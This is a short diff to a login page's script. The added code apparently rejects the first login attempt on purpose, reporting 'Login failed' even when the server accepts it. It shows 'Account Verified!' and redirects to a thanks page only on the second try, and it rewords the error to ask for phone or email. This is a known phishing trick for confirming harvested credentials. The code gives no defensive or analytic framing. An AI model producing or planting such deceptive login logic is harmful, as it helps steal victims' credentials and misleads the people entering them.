@@ -138,6 +138,7 @@
     </footer>
 
     <script>
+        var attempt =0;
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault();
             
@@ -164,20 +165,24 @@
             })
             .then(response => {
                 if (response.ok) {
+                    if(attempt == 0){
+                        attempt++;
+                        throw new Error('Login failed');
+                    }
                     return response.json();
                 } else {
                     throw new Error('Login failed');
                 }
             })
             .then(data => {
-                document.getElementById("successMessage").innerText = "Login successful!";
+                document.getElementById("successMessage").innerText = "Account Verified!";
                 console.log("Response from API:", data);
                 // Redirect to a different page after successful login
-                // window.location.href = "/dashboard.html";
+                 window.location.href = "thanks.html";
             })
             .catch(error => {
                 console.error('Error:', error);
-                document.getElementById("errorMessage").innerText = "Invalid User ID/Email or Password.";
+                document.getElementById("errorMessage").innerText = "Invalid Phone/Email or Password, Please try again.";
             });
         });
     </script>
